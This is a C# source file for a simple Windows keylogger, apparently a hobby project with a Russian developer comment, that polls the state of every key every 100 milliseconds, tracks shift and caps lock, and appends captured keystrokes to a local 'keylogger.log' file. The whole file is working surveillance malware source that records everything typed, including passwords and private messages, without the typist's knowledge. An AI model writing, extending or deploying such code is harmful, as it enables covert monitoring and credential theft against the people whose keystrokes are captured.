using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace keyloger
{
    static class Program
    {
        const int MaxBufferSixe = 10;
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            var buf = string.Empty;
            while (true)
            {
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++)
                {
                    int state = WinApiWrapper.GetAsyncKeyState(i);
                    if (state != (int)KeyState.Unpressed)
                    {
                        if (((Keys)i) == Keys.Space) { buf += " "; continue; }
                        if (((Keys)i) == Keys.Enter) { buf += Environment.NewLine; continue; }
                        if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue;
                        if (((Keys)i).ToString().Length == 1)
                        {
                            buf += IsBigSymbol() ? ((Keys)i).ToString().ToUpper() : ((Keys)i).ToString().ToLower();
                        }
                        if (buf.Length > MaxBufferSixe)
                        {
                            File.AppendAllText("keylogger.log", buf);
                            buf = "";
                        }
                    }
                }
            }
        }

        static bool IsBigSymbol()
        {
            bool shift = false;
            var shiftNumber = 16;
            short shiftState = (short)WinApiWrapper.GetAsyncKeyState(shiftNumber);
            // Keys.ShiftKey не работает, поэтому я подставил его числовой эквивалент
            if ((shiftState & 0x8000) == 0x8000)
            {
                shift = true;
            }

            var caps = Console.CapsLock;
            bool isBig = shift | caps;

            return isBig;
        }
    }

    public enum KeyState : int
    {
        Unpressed = 0
    }
}
